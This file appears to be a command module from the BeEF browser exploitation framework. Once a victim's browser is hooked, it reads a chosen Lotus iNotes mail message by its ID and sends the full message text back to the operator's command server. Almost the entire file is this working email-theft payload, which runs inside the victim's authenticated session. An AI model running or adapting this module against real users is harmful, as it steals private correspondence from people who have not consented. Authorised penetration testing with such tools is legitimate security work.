//
// Copyright (c) 2006-2025Wade Alcorn wade@bindshell.net
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
beef.execute(function() {
	var unid = '<%= @unid %>';
	
	//get URL for this nsf databse
	var currentURL = document.URL;
	var rx = /(.*\.nsf)/g;
	var arr = rx.exec(currentURL);

try {
	var notesURL = arr[1];
	
	var xhr = new XMLHttpRequest();
	xhr.open('GET', notesURL+'/%28$All%29/'+unid+'?OpenDocument&Form=l_MailMessageHeader&PresetFields=FullMessage;1', true);
	xhr.onreadystatechange = function () {
		if (xhr.readyState == 4 && xhr.status == 200) {
			beef.net.send("<%= @command_url %>", <%= @command_id %>, "result="+xhr.response);
		}
	}
	xhr.send(null);
} catch(e) {
	beef.debug("Error: " + e);
	beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Read iNotes Error: "+e);
}

});





 
